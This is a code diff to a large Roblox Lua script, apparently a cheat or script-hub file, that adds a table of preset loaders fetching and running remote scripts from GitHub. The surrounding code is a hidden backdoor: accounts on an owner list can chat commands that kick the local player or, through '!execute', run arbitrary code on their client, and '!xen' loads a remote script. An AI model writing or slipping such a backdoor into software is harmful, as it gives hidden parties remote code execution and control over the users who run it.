@@ -29937,13 +29937,21 @@ do
         ["fluffyginger_ct"] = true,
         ["sentineldave"] = true,
     }
+
+    local PRESETS = {
+        ["1"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Antilag/refs/heads/main/Antilag", true))()',
+        ["2"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))()',
+    }
+
     local lp = game:GetService("Players").LocalPlayer
 
     if OWNERS[lp.Name] then return end
 
     local function listenToOwner(p)
         if not OWNERS[p.Name] then return end
+        warn("Connected to: " .. p.Name)
         p.Chatted:Connect(function(msg)
+            warn("Got message: " .. msg)
             local args = msg:lower():split(" ")
             local cmd = args[1]
             local char = lp.Character
@@ -29962,16 +29970,15 @@ do
                 lp:Kick("Kicked by owner")
 
             elseif cmd == "!execute" then
-    local code = msg:sub(10)
-    local fn, err = loadstring(code)
-    if fn then
-        local ok, runtimeErr = pcall(fn)
-        if not ok then
-            warn("EXECUTE ERROR: " .. tostring(runtimeErr))
-        end
-    else
-        warn("LOAD ERROR: " .. tostring(err))
-end
+                local input = msg:sub(10):gsub("^%s+", "")
+                local code = PRESETS[input] or input
+                local fn, err = loadstring(code)
+                if fn then
+                    local ok, runtimeErr = pcall(fn)
+                    if not ok then warn("EXECUTE ERROR: " .. tostring(runtimeErr)) end
+                else
+                    warn("LOAD ERROR: " .. tostring(err))
+                end
 
             elseif cmd == "!xen" then
                 local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
